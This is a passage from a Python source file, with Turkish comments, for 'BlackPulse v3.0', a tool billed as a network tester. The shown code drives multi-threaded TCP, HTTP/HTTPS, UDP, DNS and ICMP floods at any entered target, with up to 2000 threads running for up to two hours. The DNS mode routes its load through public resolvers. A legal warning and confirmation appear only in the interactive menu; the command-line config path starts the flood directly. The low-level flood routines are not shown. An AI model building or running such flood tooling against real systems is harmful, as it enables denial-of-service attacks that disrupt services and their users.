            ax2.set_ylabel('Frekans')
            ax2.grid(True, alpha=0.3)
            
            # Response size grafiği
            if self.metrics.response_sizes:
                response_sizes = list(self.metrics.response_sizes)
                ax3.plot(response_sizes, color='red', alpha=0.7)
                ax3.set_title('Response Size Değişimi')
                ax3.set_xlabel('İstek Sırası')
                ax3.set_ylabel('Boyut (bytes)')
                ax3.grid(True, alpha=0.3)
            else:
                ax3.text(0.5, 0.5, 'Response Size\nverisi yok', 
                        horizontalalignment='center', verticalalignment='center',
                        transform=ax3.transAxes, fontsize=12)
            
            # Başarı/Başarısızlık pasta grafiği
            labels = ['Başarılı', 'Başarısız', 'Timeout', 'Refused']
            sizes = [self.metrics.success_count, self.metrics.fail_count, 
                    self.metrics.timeout_count, self.metrics.connection_refused]
            colors = ['green', 'red', 'orange', 'purple']
            
            # Sıfır olmayan değerleri filtrele
            filtered_data = [(label, size, color) for label, size, color in zip(labels, sizes, colors) if size > 0]
            if filtered_data:
                labels, sizes, colors = zip(*filtered_data)
                ax4.pie(sizes, labels=labels, colors=colors, autopct='%1.1f%%', startangle=90)
                ax4.set_title('Test Sonuçları Dağılımı')
            else:
                ax4.text(0.5, 0.5, 'Veri yok', horizontalalignment='center', 
                        verticalalignment='center', transform=ax4.transAxes, fontsize=12)
            
            plt.tight_layout()
            plt.savefig(filename, dpi=300, bbox_inches='tight')
            plt.close()
            
            print(f"{Colors.NEON_GREEN}[✓] Grafik rapor kaydedildi: {filename}{Colors.ENDC}")
            
        except Exception as e:
            print(f"{Colors.FAIL}[✗] Grafik oluşturulamadı: {e}{Colors.ENDC}")
            
    def _calculate_percentiles(self) -> Dict[str, float]:
        """Percentile hesapla"""
        if not self.metrics.latencies:
            return {}
            
        latencies_ms = sorted([l * 1000 for l in self.metrics.latencies])
        percentiles = {}
        
        for p in [50, 75, 90, 95, 99, 99.9]:
            idx = int(len(latencies_ms) * p / 100) - 1
            if idx >= 0:
                percentiles[f"p{p}"] = latencies_ms[idx]
                
        return percentiles

# ========== KONFIGÜRASYON YÖNETİMİ ==========
class ConfigManager:
    @staticmethod
    def load_config(config_file: str) -> Dict[str, Any]:
        """Konfigürasyon dosyası yükle"""
        try:
            with open(config_file, 'r', encoding='utf-8') as f:
                if config_file.endswith('.yaml') or config_file.endswith('.yml'):
                    return yaml.safe_load(f)
                else:
                    return json.load(f)
        except Exception as e:
            print(f"{Colors.FAIL}[✗] Konfigürasyon yüklenemedi: {e}{Colors.ENDC}")
            return {}
            
    @staticmethod
    def save_config(config: Dict[str, Any], config_file: str):
        """Konfigürasyon dosyası kaydet"""
        try:
            with open(config_file, 'w', encoding='utf-8') as f:
                if config_file.endswith('.yaml') or config_file.endswith('.yml'):
                    yaml.dump(config, f, default_flow_style=False, allow_unicode=True)
                else:
                    json.dump(config, f, indent=2, ensure_ascii=False)
            print(f"{Colors.NEON_GREEN}[✓] Konfigürasyon kaydedildi: {config_file}{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}[✗] Konfigürasyon kaydedilemedi: {e}{Colors.ENDC}")

# ========== GELİŞMİŞ MENU SİSTEMİ ==========
def show_advanced_menu():
    """Gelişmiş ana menü"""
    print_section_header("🚀 BLACKPULSE v3.0 - TEST MODü SEÇİMİ", Colors.NEON_BLUE)
    
    menu_items = [
        ("1", "🔗 TCP Flood Test", "Yüksek performanslı TCP bağlantı testi"),
        ("2", "🌐 HTTP Flood Test", "HTTP/1.1 protokol testi"),
        ("3", "🔒 HTTPS Flood Test", "SSL/TLS güvenli bağlantı testi"),
        ("4", "📡 UDP Flood Test", "UDP paket bombardımanı testi"),
        ("5", "🔄 WebSocket Test", "WebSocket protokol testi"),
        ("6", "🌍 DNS Flood Test", "DNS çözümleme stres testi"),
        ("7", "📶 ICMP Ping Test", "ICMP ping flood testi (root gerekli)"),
        ("8", "⚙️ Özel Konfigürasyon", "Dosyadan konfigürasyon yükle"),
        ("9", "📊 Sistem Bilgileri", "Sistem durumu ve optimizasyon"),
        ("0", "❌ Çıkış", "Programdan çık")
    ]
    
    for key, title, desc in menu_items:
        print(f"{Colors.NEON_GREEN}[{key}] {Colors.BOLD}{title}{Colors.ENDC}")
        print(f"    {Colors.DARK_GRAY}{desc}{Colors.ENDC}")
        
    print_separator("─", 80, Colors.DARK_GRAY)

def get_advanced_config() -> Optional[Dict[str, Any]]:
    """Gelişmiş konfigürasyon al"""
    print_section_header("⚙️ GELİŞMİŞ TEST KONFIGÜRASYONU", Colors.NEON_PURPLE)
    
    # Hedef bilgileri
    target = input(f"{Colors.NEON_BLUE}[?] Hedef (IP/domain/URL): {Colors.ENDC}").strip()
    if not target:
        print(f"{Colors.FAIL}[✗] Hedef boş olamaz!{Colors.ENDC}")
        return None
        
    # Hedef çözümle
    target_ip, target_port, resolve_info = NetworkUtils.resolve_target(target)
    if not target_ip:
        return None
        
    # Port override
    port_input = input(f"{Colors.NEON_BLUE}[?] Port ({target_port}): {Colors.ENDC}").strip()
    if port_input:
        try:
            target_port = int(port_input)
        except ValueError:
            print(f"{Colors.WARNING}[!] Geçersiz port, varsayılan kullanılıyor: {target_port}{Colors.ENDC}")
    
    # Gelişmiş parametreler
    print(f"\n{Colors.BOLD}🔧 GELİŞMİŞ PARAMETRELER:{Colors.ENDC}")
    
    try:
        thread_count = int(input(f"{Colors.NEON_BLUE}[?] Thread sayısı (100): {Colors.ENDC}").strip() or "100")
        thread_count = max(1, min(thread_count, 2000))  # Limit: 1-2000
        
        duration = int(input(f"{Colors.NEON_BLUE}[?] Test süresi/saniye (120): {Colors.ENDC}").strip() or "120")
        duration = max(1, min(duration, 7200))  # Limit: 1-7200 (2 saat)
        
        timeout = float(input(f"{Colors.NEON_BLUE}[?] Bağlantı timeout/saniye (5): {Colors.ENDC}").strip() or "5")
        timeout = max(0.1, min(timeout, 60))  # Limit: 0.1-60
        
        # İleri seviye ayarlar
        print(f"\n{Colors.BOLD}⚡ İLERİ SEVİYE AYARLAR:{Colors.ENDC}")
        
        send_data = input(f"{Colors.NEON_BLUE}[?] Veri gönder? (y/N): {Colors.ENDC}").strip().lower() == 'y'
        data_size = 1024
        if send_data:
            data_size = int(input(f"{Colors.NEON_BLUE}[?] Veri boyutu/byte (1024): {Colors.ENDC}").strip() or "1024")
            data_size = max(1, min(data_size, 65536))  # Limit: 1-64KB
            
        wait_response = input(f"{Colors.NEON_BLUE}[?] Yanıt bekle? (y/N): {Colors.ENDC}").strip().lower() == 'y'
        
        socket_pool_size = int(input(f"{Colors.NEON_BLUE}[?] Socket pool boyutu (10): {Colors.ENDC}").strip() or "10")
        socket_pool_size = max(1, min(socket_pool_size, 100))  # Limit: 1-100
        
    except ValueError as e:
        print(f"{Colors.FAIL}[✗] Geçersiz değer: {e}{Colors.ENDC}")
        return None
        
    return {
        'ip': target_ip,
        'port': target_port,
        'threads': thread_count,
        'duration': duration,
        'timeout': timeout,
        'send_data': send_data,
        'data_size': data_size,
        'wait_response': wait_response,
        'socket_pool_size': socket_pool_size,
        'resolve_info': resolve_info
    }

def show_system_info():
    """Sistem bilgilerini göster"""
    print_section_header("💻 SİSTEM BİLGİLERİ VE OPTİMİZASYON", Colors.NEON_BLUE)
    
    # Sistem bilgileri
    sys_info = NetworkUtils.get_system_info()
    
    sys_data = [
        ["🖥️ İşletim Sistemi", sys_info['platform']],
        ["⚡ CPU Çekirdek", f"{sys_info['cpu_count']} adet"],
        ["🧠 Toplam RAM", f"{sys_info['memory_gb']} GB"],
        ["🌐 Ağ Arayüzleri", f"{sys_info['network_interfaces']} adet"],
        ["📁 Max Açık Dosya", f"{sys_info['max_open_files']:,}"]
    ]
    
    print(f"\n{Colors.BOLD}📋 SİSTEM DURUMU:{Colors.ENDC}")
    print(tabulate(sys_data, tablefmt="fancy_grid", colalign=("left", "left")) if TABULATE_AVAILABLE
          else "\n".join([f"{row[0]}: {row[1]}" for row in sys_data]))
    
    # Anlık sistem durumu
    try:
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        current_data = [
            ["💻 CPU Kullanımı", f"{cpu_percent:.1f}%"],
            ["🧠 RAM Kullanımı", f"{memory.percent:.1f}%"],
            ["💾 RAM Boş", f"{(memory.available / (1024**3)):.2f} GB"],
            ["💽 Disk Kullanımı", f"{disk.percent:.1f}%"],
            ["💿 Disk Boş", f"{(disk.free / (1024**3)):.2f} GB"]
        ]
        
        print(f"\n{Colors.BOLD}📊 ANLIK DURUM:{Colors.ENDC}")
        print(tabulate(current_data, tablefmt="fancy_grid", colalign=("left", "right")) if TABULATE_AVAILABLE
              else "\n".join([f"{row[0]}: {row[1]}" for row in current_data]))
        
    except Exception as e:
        print(f"{Colors.WARNING}[!] Anlık durum alınamadı: {e}{Colors.ENDC}")
    
    # Optimizasyon önerileri
    recommendations = NetworkUtils.optimize_system()
    if recommendations:
        print(f"\n{Colors.BOLD}💡 OPTİMİZASYON ÖNERİLERİ:{Colors.ENDC}")
        for i, rec in enumerate(recommendations, 1):
            print(f"  {i}. {rec}")

# ========== ANA FONKSİYON ==========
async def run_test(test_mode: str, config: Dict[str, Any]) -> AdvancedMetrics:
    """Test çalıştır"""
    metrics = AdvancedMetrics()
    metrics.start_time = time.time()
    
    # Monitor başlat
    monitor = RealTimeMonitor(metrics, config['duration'])
    monitor_thread = monitor.start_monitoring()
    
    try:
        # Test fonksiyonlarını çalıştır
        if test_mode == 'TCP_FLOOD':
            await run_tcp_test(config, metrics)
        elif test_mode == 'HTTP_FLOOD':
            await run_http_test(config, metrics, use_ssl=False)
        elif test_mode == 'HTTPS_FLOOD':
            await run_http_test(config, metrics, use_ssl=True)
        elif test_mode == 'UDP_FLOOD':
            await run_udp_test(config, metrics)
        elif test_mode == 'WEBSOCKET_TEST':
            await run_websocket_test(config, metrics)
        elif test_mode == 'DNS_FLOOD':
            await run_dns_test(config, metrics)
        elif test_mode == 'ICMP_PING':
            await run_icmp_test(config, metrics)
            
    except KeyboardInterrupt:
        print(f"\n{Colors.NEON_RED}[!] Test kullanıcı tarafından durduruldu!{Colors.ENDC}")
    finally:
        monitor.stop_monitoring()
        monitor_thread.join(timeout=1)
        metrics.end_time = time.time()
        
    return metrics

async def run_tcp_test(config: Dict[str, Any], metrics: AdvancedMetrics):
    """TCP test çalıştır"""
    tasks = []
    for _ in range(config['threads']):
        task = asyncio.create_task(
            asyncio.to_thread(
                AdvancedTestModes.tcp_flood_advanced,
                config['ip'], config['port'], config['duration'], metrics, config
            )
        )
        tasks.append(task)
    
    await asyncio.gather(*tasks, return_exceptions=True)

async def run_http_test(config: Dict[str, Any], metrics: AdvancedMetrics, use_ssl: bool = False):
    """HTTP/HTTPS test çalıştır"""
    protocol = 'https' if use_ssl else 'http'
    url = f"{protocol}://{config['ip']}:{config['port']}"
    
    headers = {
        'User-Agent': 'BlackPulse/3.0 (Network Testing Tool)',
        'Accept': '*/*',
        'Connection': 'close'
    }
    
    connector = aiohttp.TCPConnector(limit=config['threads'])
    timeout = aiohttp.ClientTimeout(total=config.get('timeout', 10))
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = []
        end_time = time.time() + config['duration']
        
        while time.time() < end_time:
            for _ in range(min(config['threads'], 100)):  # Batch işleme
                if time.time() >= end_time:
                    break
                task = asyncio.create_task(
                    AdvancedTestModes.async_http_test(session, url, metrics, headers)
                )
                tasks.append(task)
            
            # Batch'i bekle
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
                tasks.clear()
            
            await asyncio.sleep(0.01)  # CPU'ya nefes aldır

async def run_udp_test(config: Dict[str, Any], metrics: AdvancedMetrics):
    """UDP test çalıştır"""
    tasks = []
    for _ in range(config['threads']):
        task = asyncio.create_task(
            asyncio.to_thread(
                AdvancedTestModes.udp_flood,
                config['ip'], config['port'], config['duration'], metrics
            )
        )
        tasks.append(task)
    
    await asyncio.gather(*tasks, return_exceptions=True)

async def run_websocket_test(config: Dict[str, Any], metrics: AdvancedMetrics):
    """WebSocket test çalıştır"""
    tasks = []
    for _ in range(min(config['threads'], 50)):  # WebSocket için limit
        task = asyncio.create_task(
            AdvancedTestModes.websocket_test(
                config['ip'], config['port'], config['duration'], metrics
            )
        )
        tasks.append(task)
    
    await asyncio.gather(*tasks, return_exceptions=True)

async def run_dns_test(config: Dict[str, Any], metrics: AdvancedMetrics):
    """DNS test çalıştır"""
    dns_servers = ['8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1']  # Public DNS servers
    target_domain = config.get('domain', f"{config['ip']}.nip.io")  # Fallback domain
    
    tasks = []
    for _ in range(config['threads']):
        task = asyncio.create_task(
            asyncio.to_thread(
                AdvancedTestModes.dns_flood_test,
                target_domain, config['duration'], metrics, dns_servers
            )
        )
        tasks.append(task)
    
    await asyncio.gather(*tasks, return_exceptions=True)

async def run_icmp_test(config: Dict[str, Any], metrics: AdvancedMetrics):
    """ICMP test çalıştır"""
    if os.geteuid() != 0:
        print(f"{Colors.FAIL}[✗] ICMP testi için root yetkileri gerekli!{Colors.ENDC}")
        return
    
    tasks = []
    for _ in range(min(config['threads'], 20)):  # ICMP için limit
        task = asyncio.create_task(
            asyncio.to_thread(
                AdvancedTestModes.icmp_ping_test,
                config['ip'], config['duration'], metrics, config
            )
        )
        tasks.append(task)
    
    await asyncio.gather(*tasks, return_exceptions=True)

def show_test_summary(config: Dict[str, Any], test_mode: str):
    """Test özetini göster"""
    print_section_header("📋 TEST ÖZETİ VE ONAY", Colors.WARNING)
    
    summary_data = [
        ["🎯 Hedef", f"{config['ip']}:{config['port']}"],
        ["🔧 Test Modu", test_mode.replace('_', ' ')],
        ["🧵 Thread Sayısı", f"{config['threads']:,}"],
        ["⏱️ Test Süresi", f"{config['duration']} saniye"],
        ["⏰ Timeout", f"{config.get('timeout', 5)} saniye"],
        ["📦 Veri Gönder", "Evet" if config.get('send_data', False) else "Hayır"],
        ["📊 Yanıt Bekle", "Evet" if config.get('wait_response', False) else "Hayır"]
    ]
    
    print(tabulate(summary_data, tablefmt="fancy_grid", colalign=("left", "left")) if TABULATE_AVAILABLE
          else "\n".join([f"{row[0]}: {row[1]}" for row in summary_data]))
    
    # Risk uyarısı
    total_requests_estimated = config['threads'] * config['duration'] * 10  # Rough estimate
    if total_requests_estimated > 100000:
        print(f"\n{Colors.NEON_RED}⚠️  YÜKSEK RİSK UYARISI:{Colors.ENDC}")
        print(f"   Tahmini {total_requests_estimated:,} istek gönderilecek!")
        print(f"   Bu hedef sistemi etkileyebilir!")
    elif total_requests_estimated > 10000:
        print(f"\n{Colors.WARNING}⚠️  ORTA RİSK UYARISI:{Colors.ENDC}")
        print(f"   Tahmini {total_requests_estimated:,} istek gönderilecek!")

def handle_signal(signum, frame):
    """Signal handler"""
    print(f"\n{Colors.NEON_RED}[!] Test durduruldu (Signal {signum}){Colors.ENDC}")
    sys.exit(0)

def main():
    """Ana fonksiyon"""
    # Signal handler
    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)
    
    # Logger setup
    logger = setup_logging()
    logger.info("BlackPulse v3.0 başlatıldı")
    
    clear_screen()
    print_banner()
    
    # Gerekli kütüphane kontrolü
    missing_deps = []
    required_modules = {
        'dns.resolver': 'dnspython',
        'requests': 'requests', 
        'aiohttp': 'aiohttp',
        'psutil': 'psutil',
        'yaml': 'pyyaml'
    }
    
    for module, package in required_modules.items():
        try:
            __import__(module)
        except ImportError:
            missing_deps.append(package)
    
    # Opsiyonel kütüphaneler
    optional_modules = {
        'matplotlib.pyplot': 'matplotlib',
        'numpy': 'numpy',
        'tabulate': 'tabulate',
        'websockets': 'websockets',
        'scapy': 'scapy'
    }
    
    missing_optional = []
    for module, package in optional_modules.items():
        try:
            __import__(module)
        except ImportError:
            missing_optional.append(package)
    
    if missing_deps:
        print(f"{Colors.FAIL}[✗] Eksik gerekli kütüphaneler: {', '.join(missing_deps)}{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Kurulum: pip install {' '.join(missing_deps)}{Colors.ENDC}")
        return
        
    if missing_optional:
        print(f"{Colors.WARNING}[!] Eksik opsiyonel kütüphaneler: {', '.join(missing_optional)}{Colors.ENDC}")
        print(f"{Colors.DARK_GRAY}[i] Tüm özellikler için: pip install {' '.join(missing_optional)}{Colors.ENDC}")
        print(f"{Colors.DARK_GRAY}[i] Program çalışmaya devam edecek...{Colors.ENDC}\n")
    
    # Ana döngü
    while True:
        try:
            show_advanced_menu()
            choice = input(f"{Colors.NEON_PURPLE}[?] Seçiminiz: {Colors.ENDC}").strip()
            
            if choice == '0':
                print(f"{Colors.NEON_RED}[!] BlackPulse v3.0 kapatılıyor...{Colors.ENDC}")
                logger.info("Program kullanıcı tarafından kapatıldı")
                break
            
            elif choice == '9':
                show_system_info()
                input(f"\n{Colors.NEON_BLUE}[?] Devam için Enter...{Colors.ENDC}")
                clear_screen()
                print_banner()
                continue
            
            elif choice == '8':
                config_file = input(f"{Colors.NEON_BLUE}[?] Konfigürasyon dosyası: {Colors.ENDC}").strip()
                if not config_file or not os.path.exists(config_file):
                    print(f"{Colors.FAIL}[✗] Dosya bulunamadı!{Colors.ENDC}")
                    continue
                
                config = ConfigManager.load_config(config_file)
                if not config:
                    continue
                    
                test_mode = config.get('mode', 'TCP_FLOOD')
                
            elif choice in ['1', '2', '3', '4', '5', '6', '7']:
                # Test modu belirleme
                mode_map = {
                    '1': 'TCP_FLOOD',
                    '2': 'HTTP_FLOOD',
                    '3': 'HTTPS_FLOOD',
                    '4': 'UDP_FLOOD',
                    '5': 'WEBSOCKET_TEST',
                    '6': 'DNS_FLOOD',
                    '7': 'ICMP_PING'
                }
                test_mode = mode_map[choice]
                
                # Konfigürasyon al
                config = get_advanced_config()
                if not config:
                    continue
                    
                config['mode'] = test_mode
                
            else:
                print(f"{Colors.FAIL}[✗] Geçersiz seçim!{Colors.ENDC}")
                continue
            
            # Test özeti göster ve onay al
            show_test_summary(config, test_mode)
            
            print(f"\n{Colors.NEON_RED}⚠️  YASAL UYARI: Bu aracı yalnızca sahip olduğunuz sistemlerde kullanın!{Colors.ENDC}")
            confirm = input(f"{Colors.NEON_RED}[!] Testi başlatmak istediğinizden emin misiniz? (y/N): {Colors.ENDC}").strip().lower()
            
            if confirm != 'y':
                print(f"{Colors.WARNING}[!] Test iptal edildi{Colors.ENDC}")
                continue
            
            # Test başlat
            print_section_header("🚀 TEST BAŞLATILIYOR", Colors.NEON_GREEN)
            print(f"{Colors.NEON_GREEN}[✓] Test başladı: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.ENDC}")
            
            logger.info(f"Test başlatıldı - Mod: {test_mode}, Hedef: {config['ip']}:{config['port']}")
            
            # Async test çalıştır
            metrics = asyncio.run(run_test(test_mode, config))
            
            print(f"\n{Colors.NEON_GREEN}[✓] Test tamamlandı: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.ENDC}")
            logger.info("Test tamamlandı")
            
            # Rapor oluştur
            target_info = {
                'ip': config['ip'],
                'port': config['port'],
                'resolve_info': config.get('resolve_info', {})
            }
            
            report_generator = AdvancedReportGenerator(metrics, target_info, config)
            
            # Konsol raporu
            report_generator.generate_console_report()
            
            # Dosya raporları
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            base_filename = f"blackpulse_v3_{test_mode.lower()}_{timestamp}"
            
            # JSON rapor
            json_filename = f"{base_filename}.json"
            report_generator.save_json_report(json_filename)
            
            # CSV rapor
            csv_filename = f"{base_filename}.csv"
            report_generator.save_csv_report(csv_filename)
            
            # Grafik rapor
            graph_filename = f"{base_filename}_graph.png"
            report_generator.generate_graph_report(graph_filename)
            
            # Konfigürasyon kaydet
            config_filename = f"{base_filename}_config.yaml"
            ConfigManager.save_config(config, config_filename)
            
            print(f"\n{Colors.NEON_BLUE}[📁] Tüm raporlar '{os.getcwd()}' dizinine kaydedildi{Colors.ENDC}")
            
            # Devam onayı
            input(f"\n{Colors.NEON_BLUE}[?] Ana menüye dönmek için Enter...{Colors.ENDC}")
            clear_screen()
            print_banner()
            
        except KeyboardInterrupt:
            print(f"\n{Colors.NEON_RED}[!] Program kullanıcı tarafından sonlandırıldı!{Colors.ENDC}")
            break
        except Exception as e:
            print(f"{Colors.FAIL}[✗] Beklenmeyen hata: {e}{Colors.ENDC}")
            logger.error(f"Beklenmeyen hata: {e}", exc_info=True)
            input(f"{Colors.NEON_BLUE}[?] Devam için Enter...{Colors.ENDC}")

def create_sample_config():
    """Örnek konfigürasyon dosyası oluştur"""
    sample_config = {
        "target": {
            "ip": "127.0.0.1",
            "port": 80,
            "domain": "localhost"
        },
        "test": {
            "mode": "TCP_FLOOD",
            "threads": 100,
            "duration": 120,
            "timeout": 5
        },
        "advanced": {
            "send_data": False,
            "data_size": 1024,
            "wait_response": False,
            "socket_pool_size": 10
        },
        "output": {
            "json_report": True,
            "csv_report": True,
            "graph_report": True,
            "console_report": True
        }
    }
    
    ConfigManager.save_config(sample_config, "blackpulse_sample_config.yaml")
    print(f"{Colors.NEON_GREEN}[✓] Örnek konfigürasyon oluşturuldu: blackpulse_sample_config.yaml{Colors.ENDC}")

if __name__ == "__main__":
    try:
        # Komut satırı argümanları
        parser = argparse.ArgumentParser(description='BlackPulse v3.0 - Advanced Network Testing Tool')
        parser.add_argument('--config', '-c', help='Konfigürasyon dosyası yolu')
        parser.add_argument('--create-config', action='store_true', help='Örnek konfigürasyon dosyası oluştur')
        parser.add_argument('--target', '-t', help='Hedef IP/domain')
        parser.add_argument('--port', '-p', type=int, help='Hedef port')
        parser.add_argument('--mode', '-m', help='Test modu (TCP_FLOOD, HTTP_FLOOD, etc.)')
        parser.add_argument('--threads', type=int, default=100, help='Thread sayısı')
        parser.add_argument('--duration', '-d', type=int, default=60, help='Test süresi (saniye)')
        parser.add_argument('--quiet', '-q', action='store_true', help='Sessiz mod (sadece sonuçlar)')
        
        args = parser.parse_args()
        
        if args.create_config:
            create_sample_config()
            sys.exit(0)
        
        if args.config:
            # Konfigürasyon dosyasından çalıştır
            config = ConfigManager.load_config(args.config)
            if config:
                # CLI argümanları ile override
                if args.target:
                    target_ip, target_port, resolve_info = NetworkUtils.resolve_target(args.target)
                    if target_ip:
                        config['ip'] = target_ip
                        config['port'] = target_port or config.get('port', 80)
                        config['resolve_info'] = resolve_info
                
                if args.port:
                    config['port'] = args.port
                if args.mode:
                    config['mode'] = args.mode
                if args.threads:
                    config['threads'] = args.threads
                if args.duration:
                    config['duration'] = args.duration
                
                # Direkt test çalıştır
                if not args.quiet:
                    print_banner()
                
                test_mode = config.get('mode', 'TCP_FLOOD')
                metrics = asyncio.run(run_test(test_mode, config))
                
                # Rapor oluştur
                target_info = {
                    'ip': config['ip'],
                    'port': config['port'],
                    'resolve_info': config.get('resolve_info', {})
                }
                
                report_generator = AdvancedReportGenerator(metrics, target_info, config)
                
                if not args.quiet:
                    report_generator.generate_console_report()
                
                # Dosya raporları
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                base_filename = f"blackpulse_v3_{test_mode.lower()}_{timestamp}"
                
                report_generator.save_json_report(f"{base_filename}.json")
                report_generator.save_csv_report(f"{base_filename}.csv")
                report_generator.generate_graph_report(f"{base_filename}_graph.png")
                
                sys.exit(0)
        
        # Manuel çalıştırma - GUI mod
        main()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.NEON_RED}[!] Program sonlandırıldı{Colors.ENDC}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.FAIL}[✗] Kritik hata: {e}{Colors.ENDC}")
        sys.exit(1)